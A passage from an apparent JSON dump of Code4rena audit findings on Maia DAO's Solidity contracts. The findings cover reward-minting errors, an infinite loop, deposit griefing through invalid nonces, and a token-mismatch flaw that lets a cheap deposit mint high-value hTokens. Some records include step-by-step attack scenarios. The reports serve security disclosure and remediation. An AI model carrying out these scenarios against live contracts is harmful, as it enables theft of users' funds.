Boost can't be forfeit; does not fail. +   function forfeitBoost(uint256 amount) public override {}  ... ```   ## Assessed type  Context"}, {"title": "updatePeriod() less mint HERMES", "html_url": "https://github.com/code-423n4/2023-05-maia-findings/issues/737", "labels": ["bug", "2 (Med Risk)", "primary issue", "satisfactory", "selected for report", "sponsor confirmed", "M-08"], "target": "2023-05-maia-findings", "body": "# Lines of code  https://github.com/code-423n4/2023-05-maia/blob/54a45beb1428d85999da3f721f923cbf36ee3d35/src/hermes/minters/BaseV2Minter.sol#L139-L141   # Vulnerability details  ## Impact If there is a `weekly` that has not been taken, it may result in insufficient mint HERMES  ## Proof of Concept In `updatePeriod()`, mint new `HERMES` every week with a certain percentage `weeklyEmission`.   The code is as follows.  ```solidity     function updatePeriod() public returns (uint256) {         uint256 _period = activePeriod;         // only trigger if new week         if (block.timestamp >= _period + week && initializer == address(0)) {             _period = (block.timestamp / week) * week;             activePeriod = _period;             uint256 newWeeklyEmission = weeklyEmission(); @>          weekly += newWeeklyEmission;             uint256 _circulatingSupply = circulatingSupply();              uint256 _growth = calculateGrowth(newWeeklyEmission);             uint256 _required = _growth + newWeeklyEmission;             /// @dev share of newWeeklyEmission emissions sent to DAO.             uint256 share = (_required * daoShare) / base;             _required += share;             uint256 _balanceOf = underlying.balanceOf(address(this));           @>          if (_balanceOf < _required) {                 HERMES(underlying).mint(address(this), _required - _balanceOf);             }              underlying.safeTransfer(address(vault), _growth);              if (dao != address(0)) underlying.safeTransfer(dao, share);              emit Mint(msg.sender, newWeeklyEmission, _circulatingSupply, _growth, share);              /// @dev queue rewards for the cycle, anyone can call if fails             ///      queueRewardsForCycle will call this function but won't enter             ///      here because activePeriod was updated             try flywheelGaugeRewards.queueRewardsForCycle() {} catch {}         }         return _period;     } ```  The above code will first determine if the balance of the current contract is less than `_required` and if it is less, then mint new `HERMES`, so that there will be enough `HERMES` for the distribution.  But there is a problem that the current balance of contract may contain the last `weekly` HERMES,that  `flywheelGaugeRewards` have not yet been taken:  (e.g. last week's allocation of weeklyEmission)  Because the `gaugeCycle` of `flywheelGaugeRewards` may be greater than one week. So it is possible that the last `weekly`  HERMES has not yet been taken.  So we can't use the current balance to compare with `_required` directly, we need to Consider  the `weekly` staying in the contract, it hasn't been taken, to avoid not having enough balance when `flywheelGaugeRewards` comes to take `weekly`.   ## Tools Used  ## Recommended Mitigation Steps  ```solidity     function updatePeriod() public returns (uint256) {         uint256 _period = activePeriod;         // only trigger if new week         if (block.timestamp >= _period + week && initializer == address(0)) {             _period = (block.timestamp / week) * week;             activePeriod = _period;             uint256 newWeeklyEmission = weeklyEmission();             weekly += newWeeklyEmission;             uint256 _circulatingSupply = circulatingSupply();              uint256 _growth = calculateGrowth(newWeeklyEmission);             uint256 _required = _growth + newWeeklyEmission;             /// @dev share of newWeeklyEmission emissions sent to DAO.             uint256 share = (_required * daoShare) / base;             _required += share;             uint256 _balanceOf = underlying.balanceOf(address(this));           -           if (_balanceOf < _required) { +           if (_balanceOf < weekly + _growth + share ) { -              HERMES(underlying).mint(address(this), _required - _balanceOf); +              HERMES(underlying).mint(address(this),weekly + _growth + share - _balanceOf);             }              underlying.safeTransfer(address(vault), _growth);              if (dao != address(0)) underlying.safeTransfer(dao, share);              emit Mint(msg.sender, newWeeklyEmission, _circulatingSupply, _growth, share);              /// @dev queue rewards for the cycle, anyone can call if fails             ///      queueRewardsForCycle will call this function but won't enter             ///      here because activePeriod was updated             try flywheelGaugeRewards.queueRewardsForCycle() {} catch {}         }         return _period;     } ```   ## Assessed type  Context"}, {"title": "_decrementWeightUntilFree() Possible infinite loop", "html_url": "https://github.com/code-423n4/2023-05-maia-findings/issues/735", "labels": ["bug", "2 (Med Risk)", "primary issue", "satisfactory", "selected for report", "sponsor confirmed", "M-09"], "target": "2023-05-maia-findings", "body": "# Lines of code  https://github.com/code-423n4/2023-05-maia/blob/54a45beb1428d85999da3f721f923cbf36ee3d35/src/erc-20/ERC20Gauges.sol#L547-L549   # Vulnerability details  ## Impact the position of `i++` is wrong, which may lead to an infinite loop  ## Proof of Concept In the loop of the `_decrementWeightUntilFree()` method, the position of `i++` is wrong, which may lead to a infinite loop  ```solidity     function _decrementWeightUntilFree(address user, uint256 weight) internal nonReentrant { ...         for (uint256 i = 0; i < size && (userFreeWeight + totalFreed) < weight;) {             address gauge = gaugeList[i];             uint112 userGaugeWeight = getUserGaugeWeight[user][gauge];             if (userGaugeWeight != 0) {                 // If the gauge is live (not deprecated), include its weight in the total to remove                 if (!_deprecatedGauges.contains(gauge)) {                     totalFreed += userGaugeWeight;                 }                 userFreed += userGaugeWeight;                 _decrementGaugeWeight(user, gauge, userGaugeWeight, currentCycle);                 unchecked { @>                  i++;                 }             }         } ```  In the above code, when `userGaugeWeight == 0`, `i` is not incremented, resulting in a infinite loop. The current protocol does not restrict `getUserGaugeWeight[user][gauge] == 0`.  ## Tools Used  ## Recommended Mitigation Steps  ```solidity     function _decrementWeightUntilFree(address user, uint256 weight) internal nonReentrant { ...         for (uint256 i = 0; i < size && (userFreeWeight + totalFreed) < weight;) {             address gauge = gaugeList[i];             uint112 userGaugeWeight = getUserGaugeWeight[user][gauge];             if (userGaugeWeight != 0) {                 // If the gauge is live (not deprecated), include its weight in the total to remove                 if (!_deprecatedGauges.contains(gauge)) {                     totalFreed += userGaugeWeight;                 }                 userFreed += userGaugeWeight;                 _decrementGaugeWeight(user, gauge, userGaugeWeight, currentCycle); -               unchecked { -                  i++; -               }             } +           unchecked { +             i++; +           }                     } ```    ## Assessed type  Context"}, {"title": "withdrawProtocolFees() Possible malicious or accidental withdrawal of all rewards", "html_url": "https://github.com/code-423n4/2023-05-maia-findings/issues/731", "labels": ["bug", "3 (High Risk)", "primary issue", "satisfactory", "selected for report", "sponsor confirmed", "H-06"], "target": "2023-05-maia-findings", "body": "# Lines of code  https://github.com/code-423n4/2023-05-maia/blob/54a45beb1428d85999da3f721f923cbf36ee3d35/src/talos/boost-aggregator/BoostAggregator.sol#L159-L161   # Vulnerability details  ## Impact `claimReward()` will take all rewards if the `amountRequested` passed in is 0, which may result in user's rewards lost  ## Proof of Concept In `BoostAggregator.withdrawProtocolFees()`, the owner can take the protocol rewards `protocolRewards` The code is as follows: ```solidity     function withdrawProtocolFees(address to) external onlyOwner {         uniswapV3Staker.claimReward(to, protocolRewards); @>      delete protocolRewards;     } ```  From the above code we can see that `uniswapV3Staker` is called to fetch and then clear `protocolRewards`  Let's look at the implementation of `uniswapV3Staker.claimReward()`.  ```solidity contract UniswapV3Staker is IUniswapV3Staker, Multicallable { ....     function claimReward(address to, uint256 amountRequested) external returns (uint256 reward) {         reward = rewards[msg.sender]; @>      if (amountRequested != 0 && amountRequested < reward) {             reward = amountRequested;             rewards[msg.sender] -= reward;         } else {             rewards[msg.sender] = 0;         }          if (reward > 0) hermes.safeTransfer(to, reward);          emit RewardClaimed(to, reward);     } ```  The current implementation is that if the `amountRequested==0` passed in means that all `rewards[msg.sender]` of this `msg.sender` are taken    This leads to problems. 1. If a malicious `owner` calls `withdrawProtocolFees()` twice in a row, it will definitely take all the `rewards` of the `BoostAggregator`. 2. probably didn't realize that `withdrawProtocolFees()` was called when `protocolRewards==0`  As a result, the rewards that belong to users in `BoostAggregator` are lost    ## Tools Used  ## Recommended Mitigation Steps  Modify `claimReward()` to remove `amountRequested != 0`  ```solidity contract UniswapV3Staker is IUniswapV3Staker, Multicallable { ....     function claimReward(address to, uint256 amountRequested) external returns (uint256 reward) {         reward = rewards[msg.sender]; -       if (amountRequested != 0 && amountRequested < reward) {         +       if (amountRequested < reward) {             reward = amountRequested;             rewards[msg.sender] -= reward;         } else {             rewards[msg.sender] = 0;         }          if (reward > 0) hermes.safeTransfer(to, reward);          emit RewardClaimed(to, reward);     } ```   ## Assessed type  Context"}, {"title": "redeem() beforeRedeem using the wrong owner parameter", "html_url": "https://github.com/code-423n4/2023-05-maia-findings/issues/730", "labels": ["bug", "3 (High Risk)", "satisfactory", "selected for report", "sponsor confirmed", "H-07"], "target": "2023-05-maia-findings", "body": "# Lines of code  https://github.com/code-423n4/2023-05-maia/blob/54a45beb1428d85999da3f721f923cbf36ee3d35/src/talos/base/TalosBaseStrategy.sol#L257   # Vulnerability details  ## Impact Wrong owner parameter, causing users to lose rewards  ## Proof of Concept In `TalosStrategyStaked.sol` If the user's `shares` have changed, we need to do `flywheel.accrue()` first, which will accrue `rewards` and update the corresponding `userIndex`. This way we can ensure the accuracy of `rewards`. So we will call `flywheel.accrue()` beforeDeposit/beforeRedeem/transfer etc.  Take `redeem()` as an example, the code is as follows:  ```solidity contract TalosStrategyStaked is TalosStrategySimple, ITalosStrategyStaked { ...      function beforeRedeem(uint256 _tokenId, address _owner) internal override {         _earnFees(_tokenId); @>      flywheel.accrue(_owner);     } ```   But when `beforeRedeem()` is called with the wrong owner passed in, the `redeem()` code is as follows:   ```solidity     function redeem(uint256 shares, uint256 amount0Min, uint256 amount1Min, address receiver, address _owner)         public         virtual         override         nonReentrant         checkDeviation         returns (uint256 amount0, uint256 amount1)     { ...         if (msg.sender != _owner) {             uint256 allowed = allowance[_owner][msg.sender]; // Saves gas for limited approvals.              if (allowed != type(uint256).max) allowance[_owner][msg.sender] = allowed - shares;         }          if (shares == 0) revert RedeemingZeroShares();         if (receiver == address(0)) revert ReceiverIsZeroAddress();          uint256 _tokenId = tokenId; @>      beforeRedeem(_tokenId, receiver);          INonfungiblePositionManager _nonfungiblePositionManager = nonfungiblePositionManager; // Saves an extra SLOAD         {             uint128 liquidityToDecrease = uint128((liquidity * shares) / totalSupply);              (amount0, amount1) = _nonfungiblePositionManager.decreaseLiquidity(                 INonfungiblePositionManager.DecreaseLiquidityParams({                     tokenId: _tokenId,                     liquidity: liquidityToDecrease,                     amount0Min: amount0Min,                     amount1Min: amount1Min,                     deadline: block.timestamp                 })             );              if (amount0 == 0 && amount1 == 0) revert AmountsAreZero();  @>          _burn(_owner, shares);              liquidity -= liquidityToDecrease;         }     ```   From the above code, we see that the parameter is `receiver`, but the person whose shares are burn is `_owner`.  We need to accrue `_owner`, not `receiver`  This leads to a direct reduction of the user's shares without `accrue`, and the user loses the corresponding rewards   ## Tools Used  ## Recommended Mitigation Steps  ```solidity     function redeem(uint256 shares, uint256 amount0Min, uint256 amount1Min, address receiver, address _owner)         public         virtual         override         nonReentrant         checkDeviation         returns (uint256 amount0, uint256 amount1)     {         if (msg.sender != _owner) {             uint256 allowed = allowance[_owner][msg.sender]; // Saves gas for limited approvals.              if (allowed != type(uint256).max) allowance[_owner][msg.sender] = allowed - shares;         }          if (shares == 0) revert RedeemingZeroShares();         if (receiver == address(0)) revert ReceiverIsZeroAddress();          uint256 _tokenId = tokenId; -       beforeRedeem(_tokenId, receiver); +       beforeRedeem(_tokenId, _owner); ```   ## Assessed type  Context"}, {"title": "Analysis", "html_url": "https://github.com/code-423n4/2023-05-maia-findings/issues/716", "labels": ["grade-b", "satisfactory", "sponsor confirmed", "analysis"], "target": "2023-05-maia-findings", "body": "See the markdown file with the details of this report [here](https://github.com/code-423n4/2023-05-maia-findings/blob/main/data/Velislav4o-Analysis.md)."}, {"title": "The user is enforced to overpay for the fallback gas when `retryDeposit`", "html_url": "https://github.com/code-423n4/2023-05-maia-findings/issues/710", "labels": ["bug", "2 (Med Risk)", "primary issue", "satisfactory", "selected for report", "sponsor confirmed", "M-10"], "target": "2023-05-maia-findings", "body": "# Lines of code  https://github.com/code-423n4/2023-05-maia/blob/main/src/ulysses-omnichain/BranchBridgeAgent.sol#L319-L328   # Vulnerability details  ## Impact `BranchBridgeAgent.retryDeposit` is used to top up a previous deposit and perform a call afterwards.  A modifier `requiresFallbackGas` is added to the method to verifiy enough gas is deposited to pay for an eventual fallback call. The same is done when creating a new deposit.  - retryDeposit ```  function retryDeposit(   bool _isSigned,   uint32 _depositNonce,   bytes calldata _params,   uint128 _remoteExecutionGas,   uint24 _toChain  ) external payable lock requiresFallbackGas {   //Check if deposit belongs to message sender   if (getDeposit[_depositNonce].owner != msg.sender) revert NotDepositOwner();   .  .  .  . ``` https://github.com/code-423n4/2023-05-maia/blob/main/src/ulysses-omnichain/BranchBridgeAgent.sol#L319-L328  - An example of a new deposit/call ```solidity // One example     function callOutSignedAndBridge(bytes calldata _params, DepositInput memory _dParams, uint128 _remoteExecutionGas)         external         payable         lock         requiresFallbackGas     {  // Another one     function callOutSignedAndBridgeMultiple(         bytes calldata _params,         DepositMultipleInput memory _dParams,         uint128 _remoteExecutionGas     ) external payable lock requiresFallbackGas {  ```   Let's have a look at the modifier `requiresFallbackGas` ```     /// @notice Modifier that verifies enough gas is deposited to pay for an eventual fallback call.     modifier requiresFallbackGas() {         _requiresFallbackGas();         _;     }      /// @notice Verifies enough gas is deposited to pay for an eventual fallback call. Reuse to reduce contract bytesize.     function _requiresFallbackGas() internal view virtual {         if (msg.value <= MIN_FALLBACK_RESERVE * tx.gasprice) revert InsufficientGas();     } ``` https://github.com/code-423n4/2023-05-maia/blob/main/src/ulysses-omnichain/BranchBridgeAgent.sol#L1404-L1412  It checks if the msg.value (deposited gas) is sufficient. This is used for both a new deposit and topping up an existing deposit. For a new deposit it makes sense. However, for topping up an existing deposit it doesn't consider the old deposited amount which enforce the user to overpay for the gas when `retryDeposit`. Please have a look at the PoC to get a clearer picture.   ## Proof of Concept  Imagine the following scenario: - User **Bob** makes a request by `BaseBranchRouter.callOutAndBridge` with msg.value 0.1 ETH (**deposited gas is 0.1 ETH**) assuming the **cost of MIN_FALLBACK_RESERVE is 0.1 ETH**. - This calls `BranchBridgeAgent.performCallOutAndBridge`  - BranchBridgeAgent creates deposit and send Cross-Chain request by calling `AnycallProxy.anyCall` - Now AnyCall Executor calls `RootBridgeAgent.anyExecute` - Let's say `RootBridgeAgent.anyExecute` couldn't complete due to insufficient available gas. ```solidity  //Get Available Gas  uint256 availableGas = _depositedGas - _gasToBridgeOut;   //Get Root Environment Execution Cost  uint256 minExecCost = tx.gasprice * (MIN_EXECUTION_OVERHEAD + _initialGas - gasleft());   //Check if sufficient balance  if (minExecCost > availableGas) {   _forceRevert();   return;  } ``` https://github.com/code-423n4/2023-05-maia/blob/main/src/ulysses-omnichain/RootBridgeAgent.sol#L810-L817  - Notice that this _forceReverts and doesn't revert directly. This is to avoid triggering the fallback in BranchBridgeAgent (below an explanation of _forceRevert). - Let's assume that the additional required deposit was 0.05 ETH - So now  **Bob** should top up the deposit with 0.05 ETH. - **Bob** calls `BranchBridgeAgent.retryDeposit` and since there is `requiresFallbackGas` modifier, he has to pass at least 0.1 ETH cost of MIN_FALLBACK_RESERVE. Thus, overpaying when it is not necessary.  This happens due to the lack of considering the already existing deposted gas amount.  Note: for simplicity, we assumed that tx.gasPrice didn't change.   #### About _forceRevert `_forceRevert` withdraws all execution budget. ```  // Withdraw all execution gas budget from anycall for tx to revert with \"no enough budget\"  if (executionBudget > 0) try anycallConfig.withdraw(executionBudget) {} catch {} ```  So Anycall Executor will revert if there is not enough budget. This is done at  ```solidity  uint256 budget = executionBudget[_from];  require(budget > totalCost, \"no enough budget\");  executionBudget[_from] = budget - totalCost; ``` https://github.com/anyswap/multichain-smart-contracts/blob/main/contracts/anycall/v7/AnycallV7Config.sol#L206C42-L206C58  This way we avoid reverting directly. Instead, we let Anycall Executor to revert avoiding triggering the fallback.  ## Tools Used Manual analysis  ## Recommended Mitigation Steps   For  `retryDeposit`, use the internal function `_requiresFallbackGas(uint256 _depositedGas)` instead of the modifier. Pass the existing deposited gas + msg.value to the function. Example: ```solidity _requiresFallbackGas(getDeposit[_depositNonce].depositedGas+msg.value) ```  https://github.com/code-423n4/2023-05-maia/blob/main/src/ulysses-omnichain/BranchBridgeAgent.sol#L1415-L1417   ## Assessed type  Other"}, {"title": "Analysis", "html_url": "https://github.com/code-423n4/2023-05-maia-findings/issues/705", "labels": ["grade-b", "satisfactory", "sponsor confirmed", "analysis"], "target": "2023-05-maia-findings", "body": "See the markdown file with the details of this report [here](https://github.com/code-423n4/2023-05-maia-findings/blob/main/data/p_crypt0-Analysis.md)."}, {"title": "Due to inadequate checks, Adversary can call `BranchBridgeAgent#retrieveDeposit` with an invalid `_depositNonce`, which would lead to loss of other users' deposit.", "html_url": "https://github.com/code-423n4/2023-05-maia-findings/issues/688", "labels": ["bug", "3 (High Risk)", "primary issue", "satisfactory", "selected for report", "sponsor confirmed", "H-08"], "target": "2023-05-maia-findings", "body": "# Lines of code  https://github.com/code-423n4/2023-05-maia/blob/main/src/ulysses-omnichain/BranchBridgeAgent.sol#L433   # Vulnerability details  ## Impact Attacker will cause user's funds to be collected and locked on Branch chain without it being recorded on root chain.   ## Proof of Concept Anyone can call `BranchBridgeAgent#retrieveDeposit`, with an invalid `_depositNonce`:  ```solidity function retrieveDeposit(         uint32 _depositNonce     ) external payable lock requiresFallbackGas {         //Encode Data for cross-chain call.         bytes memory packedData = abi.encodePacked(             bytes1(0x08),             _depositNonce,             msg.value.toUint128(),             uint128(0)         );          //Update State and Perform Call         _sendRetrieveOrRetry(packedData);     } ```  If for example, global depositNonce is x, attacker can call `retrieveDeposit(x+y)`. `RootBridgeAgent#anyExecute` will be called, and the executionHistory for the depositNonce that the attacker specified would be updated to true:  ```solidity     function anyExecute(bytes calldata data){         ...     /// DEPOSIT FLAG: 8 (retrieveDeposit)     else if (flag == 0x08) {     //Get nonce     uint32 nonce = uint32(bytes4(data[1:5]));      //Check if tx has already been executed     if (!executionHistory[fromChainId][uint32(bytes4(data[1:5]))]) {         //Toggle Nonce as executed         executionHistory[fromChainId][nonce] = true;          //Retry failed fallback         (success, result) = (false, \"\");     } else {         _forceRevert();         //Return true to avoid triggering anyFallback in case of `_forceRevert()` failure         return (true, \"already executed tx\");     }     }     ...     } ```  This means that when a user makes a deposit on that BranchBridgeAgent and his Deposit gets assigned a depositNonce which attacker previously called retrieveDeposit for, his tokens would be collected on that BranchBridgeAgent, but would not succeed on RootBridgeAgent because executionHistory for that depositNonce has already been maliciously set to true.  ### Attack Scenario  - current global deposit nonce is 50 - attacker calls retrieveDeposit(60), which would update executionHistory of depositNonce 60 to true on Root chain - when a user tries to call any of the functions(say callOutAndBridge), and gets assigned depositNonce of 60, it won't be executed on root chain because executionHistory for depositNonce 60 is already set to true - User won't also be able to claim his tokens because anyFallback was not triggered. So he has lost his deposit.  ## Tools Used Manual Review  ## Recommended Mitigation Steps A very simple and effective solution is to ensure that in the `BranchBridgeAgent#retrieveDepoit` function, `msg.sender==getDeposit[_depositNonce].owner` just like it was done in [`BranchBridgeAgent#retryDeposit`](https://github.com/code-423n4/2023-05-maia/blob/main/src/ulysses-omnichain/BranchBridgeAgent.sol#L327)    ## Assessed type  Invalid Validation"}, {"title": "`RootBridgeAgent->CheckParamsLib#checkParams` does not check that `_dParams.token` is underlying of `_dParams.hToken`", "html_url": "https://github.com/code-423n4/2023-05-maia-findings/issues/687", "labels": ["bug", "3 (High Risk)", "primary issue", "satisfactory", "selected for report", "sponsor confirmed", "H-09"], "target": "2023-05-maia-findings", "body": "# Lines of code  https://github.com/code-423n4/2023-05-maia/blob/main/src/ulysses-omnichain/RootBridgeAgent.sol#L58   # Vulnerability details  ## Impact A malicious user would make a deposit specifying an hToken of a high value(say hEther), and a depositToken of relatively lower value(say USDC), and for that user, RootBridgeAgent would increment his hToken balance by the amount of depositTokens he sent  ## Proof of Concept Here is the `checkParams` function:  ```solidity function checkParams(address _localPortAddress, DepositParams memory _dParams, uint24 _fromChain)         internal         view         returns (bool)     {         if (             (_dParams.amount < _dParams.deposit) //Deposit can't be greater than amount.                 || (_dParams.amount > 0 && !IPort(_localPortAddress).isLocalToken(_dParams.hToken, _fromChain)) //Check local exists.                 || (_dParams.deposit > 0 && !IPort(_localPortAddress).isUnderlyingToken(_dParams.token, _fromChain)) //Check underlying exists.         ) {             return false;         }         return true;     } ```  The function performs 3 checks:  - \\_dParams.amount must be less than or equal to \\_dParams.deposit - If \\_dParams.amount>0, \\_dParams.hToken must be a valid localToken - If \\_dParams.deposit>0, \\_dParams.token must be a valid underlying token.  The PROBLEM is that the check only requires that `getLocalTokenFromUnder[_dParams.token]`!=`address(0)`, but does not check that `getLocalTokenFromUnder[_dParams.token]`==`_dParams.hToken`:  ```solidity     function isUnderlyingToken(         address _underlyingToken,         uint24 _fromChain     ) external view returns (bool) {         return             getLocalTokenFromUnder[_underlyingToken][_fromChain] != address(0);     } ```  The checkParams function is used in the `RootBridgeAgent#bridgeIn` function.  This allows a user to call `BranchBridgeAgent#callOutAndBridge` with a `hToken` and `token` that are not related  ## ATTACK SCENARIO  - Current price of Ether is 1800USDC - RootBridgeAgent is deployed on Arbitrum - BranchBridgeAgent for Ethereum mainnet has two local tokens recorded in RootBridgeAgent:   - hEther(whose underlying is Ether)   - hUSDC(whose underlying is USDC) - Alice calls `BranchBridgeAgent#callOutAndBridge` on ethereum with the following as DepositInput(\\_dParams):   - hToken(address of local hEther)   - token(address of USDC)   - amount(0)   - deposit(10)   - toChain(42161) - `BranchPort#bridgeOut` transfers 10 USDC from user to BranchPort, and anyCall call is made to RootBridgeAgent - `RootBridgeAgent#bridgeIn` is called which calls `CheckParamsLib.checkParams`   - `checkParams` verifies that \\_dParams.amount(0) is less than or equal to \\_dParams.deposit(10)\u2705   - verifies that \\_dParams.hToken(hEther) is a valid localToken\u2705   - verifies that \\_dParams.token(USDC) is a valid underlying token(i.e. its local token is non zero)\u2705 - `RootBridgeAgent#bridgeIn` calls `RootPort#bridgeToRoot` which mints 10 global hEther to user `if (_deposit > 0) mint(_recipient, _hToken, _deposit, _fromChainId);` - With just 10 USDC, user has been able to get 10 ether(18000USDC) worth of funds on root chain.  Execution flow: `BranchBridgeAgent#callOutAndBridge`->`BranchBridgeAgent#_callOutAndBridge`->`BranchBridgeAgent#_depositAndCall`->`BranchBridgeAgent#_performCall`->`RootBridgeAgent#anyExecute`->`RootBridgeAgentExecutor#executeWithDeposit`->`RootBridgeAgentExecutor#_bridgeIn`->`RootBridgeAgent#bridgeIn`  ## Tools Used Manual Review  ## Recommended Mitigation Steps Currently, the protocol only checks if the token is recognized by rootport as an underlying token by checking that the registered local token for `_dParams.token` is not zero address.  - Instead of that, it would be more effective to check that the registered local token for `_dParams.token` is equal to `_dParams.hToken`. - Some sanity checks may also be done on DepositInput(\\_dParams) in BranchBridgeAgent. Although this is not necessary.    ## Assessed type  Invalid Validation"}, {"title": "deposit gas through depositGasAnycallConfig should not withdraw the nativeToken", "html_url": "https://github.com/code-423n4/2023-05-maia-findings/issues/679", "labels": ["bug", "2 (Med Risk)", "primary issue", "satisfactory", "selected for report", "sponsor confirmed", "M-11"], "target": "2023-05-maia-findings", "body": "# Lines of code  https://github.com/code-423n4/2023-05-maia/blob/54a45beb1428d85999da3f721f923cbf36ee3d35/src/ulysses-omnichain/RootBridgeAgent.sol#L1219-L1222 https://github.com/code-423n4/2023-05-maia/blob/54a45beb1428d85999da3f721f923cbf36ee3d35/src/ulysses-omnichain/RootBridgeAgent.sol#L848-L852   # Vulnerability details  ## Impact  DepositGasAnycallConfig can deposit the gas fee externally, but here should not withdraw the nativeToken. This prevents gas from being deposited.  ## Proof of Concept  There are two ways to store gas in RootBridgeAgent:  ```solidity // deposit GAS function _manageGasOut(uint24 _toChain) internal returns (uint128) {     uint256 amountOut;     address gasToken;     uint256 _initialGas = initialGas;      if (_toChain == localChainId) {         //Transfer gasToBridgeOut Local Branch Bridge Agent if remote initiated call.         if (_initialGas > 0) {             address(wrappedNativeToken).safeTransfer(getBranchBridgeAgent[localChainId], userFeeInfo.gasToBridgeOut);         }          return uint128(userFeeInfo.gasToBridgeOut);     }      if (_initialGas > 0) {         if (userFeeInfo.gasToBridgeOut <= MIN_FALLBACK_RESERVE * tx.gasprice) revert InsufficientGasForFees();         (amountOut, gasToken) = _gasSwapOut(userFeeInfo.gasToBridgeOut, _toChain);     } else {         if (msg.value <= MIN_FALLBACK_RESERVE * tx.gasprice) revert InsufficientGasForFees();         wrappedNativeToken.deposit{value: msg.value}();         (amountOut, gasToken) = _gasSwapOut(msg.value, _toChain);     }      IPort(localPortAddress).burn(address(this), gasToken, amountOut, _toChain);     return amountOut.toUint128(); }   // pay GAS if (localAnyCallExecutorAddress == msg.sender) {     //Save initial gas     initialGas = _initialGas; } //Zero out gas after use if remote call if (initialGas > 0) {     _payExecutionGas(userFeeInfo.depositedGas, userFeeInfo.gasToBridgeOut, _initialGas, fromChainId); } ``` When localAnyCallExecutorAddress invoke anyExecute, gas fee is stored in nativeToken first, then later withdraw from nativeToken and stored into multichain. That's right  ```solidity     function depositGasAnycallConfig() external payable {         //Deposit Gas         _replenishGas(msg.value);     }      function _replenishGas(uint256 _executionGasSpent) internal {         //Unwrap Gas         wrappedNativeToken.withdraw(_executionGasSpent);         IAnycallConfig(IAnycallProxy(localAnyCallAddress).config()).deposit{value: _executionGasSpent}(address(this));     } ```  But when deposit gas directly from the outside, there is no need to interact with wrappedNativeToken, and the withdraw prevents the deposit.  ## Tools Used  Manual review  ## Recommended Mitigation Steps  Also add a deposit logic to depositGasAnycallConfig, or remove the withdraw logic   ## Assessed type  Context"}, {"title": "When an anyExecute call is made to `RootBridgeAgent` with a `depositNonce` that has been recorded in `executionHistory`, initialGas and userFeeInfo will not be updated, which would affect the next caller of `retrySettlement`.", "html_url": "https://github.com/code-423n4/2023-05-maia-findings/issues/676", "labels": ["bug", "2 (Med Risk)", "primary issue", "satisfactory", "selected for report", "sponsor confirmed", "M-12"], "target": "2023-05-maia-findings", "body": "# Lines of code  https://github.com/code-423n4/2023-05-maia/blob/main/src/ulysses-omnichain/RootBridgeAgent.sol#L873-L890 https://github.com/code-423n4/2023-05-maia/blob/main/src/ulysses-omnichain/RootBridgeAgent.sol#L922 https://github.com/code-423n4/2023-05-maia/blob/main/src/ulysses-omnichain/RootBridgeAgent.sol#L246 https://github.com/code-423n4/2023-05-maia/blob/main/src/ulysses-omnichain/RootBridgeAgent.sol#L571   # Vulnerability details  ## Impact Wrong userFeeInfo will be used when `retrySettlement` is called directly.  ## Proof of Concept Here is `retrySettlement` function:  ```solidity function retrySettlement(     uint32 _settlementNonce,     uint128 _remoteExecutionGas ) external payable {     //Update User Gas available.     if (initialGas == 0) {         userFeeInfo.depositedGas = uint128(msg.value);         userFeeInfo.gasToBridgeOut = _remoteExecutionGas;     }     //Clear Settlement with updated gas.     _retrySettlement(_settlementNonce); } ```  The assumption here is that if initialGas is not 0, then `retrySettlement` is being called by `RootBridgeAgent#anyExecute`, which has already set values for initialGas and userFeeInfo(which would later be deleted at end of the anycall function), but if it is 0, then retrySettlement is being called directly by a user, so user should specify `_remoteExecutionGas` and send some `msg.value` with the call, which would make up the userFeeInfo. But this assumption is not completely correct because whenever `RootBridgeAgent#anyExecute` is called with a depositNonce that has been recorded in executionHistory, the function returns early, which prevents other parts of the anyExecute function from being executed. At the beginning of anyExecute, initialGas and userFeeInfo values are set and at the end of anyExecute call, if initialGas>0, `_payExecutionGas` sets initialGas and userFeeInfo to 0. So when the function returns earlier, before `_payExecutionGas` is called, initialGas and userFeeInfo are not updated. If a user calls `retrySettlement` immediately after that, the call will use a wrong userFeeInfo(i.e. userFeeInfo set when anyExecute was called with a depositNonce that has already been recorded) because initialGas!=0. Whereas, it was meant to use values sent by caller of `retrySettlement`  Looking at a part of `_manageGasOut` logic which is called in `_retrySettlement`,  ```solidity  if (_initialGas > 0) {     if (         userFeeInfo.gasToBridgeOut <= MIN_FALLBACK_RESERVE * tx.gasprice     ) revert InsufficientGasForFees();     (amountOut, gasToken) = _gasSwapOut(         userFeeInfo.gasToBridgeOut,         _toChain     ); } else {     if (msg.value <= MIN_FALLBACK_RESERVE * tx.gasprice)         revert InsufficientGasForFees();     wrappedNativeToken.deposit{value: msg.value}();     (amountOut, gasToken) = _gasSwapOut(msg.value, _toChain); } ```  This could cause one of these:  - User's `retrySettlement` call would revert if userFeeInfo.gasToBridgeOut(which user does not have control over) is less than `MIN_FALLBACK_RESERVE * tx.gasprice` - User's call passes without him sending any funds, so he makes a free `retrySettlement` transaction   ## Tools Used Manual Review  ## Recommended Mitigation Steps  Consider implementing one of these:  - restrict retrySettlement to only be called by AgentExecutor - or delete initialGas and userFeeInfo before return is called if nonce has been executed before:  ```solidity //Check if tx has already been executed if (executionHistory[fromChainId][nonce]) {     _forceRevert();     delete initialGas;     delete userFeeInfo;     //Return true to avoid triggering anyFallback in case of `_forceRevert()` failure     return (true, \"already executed tx\"); } ```    ## Assessed type  Error"}, {"title": "TalosBaseStrategy#init() lacks slippage protection", "html_url": "https://github.com/code-423n4/2023-05-maia-findings/issues/658", "labels": ["bug", "3 (High Risk)", "primary issue", "satisfactory", "selected for report", "sponsor confirmed", "upgraded by judge", "H-10"], "target": "2023-05-maia-findings", "body": "# Lines of code  https://github.com/Maia-DAO/maia-ecosystem-monorepo/blob/2f6e87348877684aa0c12aec204fea210cfbe6eb/src/scope/talos/base/TalosBaseStrategy.sol#L99-L147 https://github.com/Maia-DAO/maia-ecosystem-monorepo/blob/2f6e87348877684aa0c12aec204fea210cfbe6eb/src/scope/talos/base/TalosBaseStrategy.sol#L419-L425   # Vulnerability details  `checkDeviation` modifier purpose is to add slippage protection for increase/decrease liquidity operations. It's applied to `deposit/redeem`, `rerange/rebalance`  but `init()` is missing it.   ## Impact There is no slippage protection on `init()`.  ## Proof of Concept  In the `init()` function of TalosBaseStrategy, the following actions are performed: an initial deposit is made, a tokenId and shares are minted.   The `_nonfungiblePositionManager.mint()` function is called with hardcoded values of `amount0Min` and `amount1Min`, both set to 0. Additionally, it should be noted that the `init()` function does not utilize the `checkDeviation` modifier, which was specifically designed to safeguard users against slippage.   ```solidity     function init(uint256 amount0Desired, uint256 amount1Desired, address receiver)        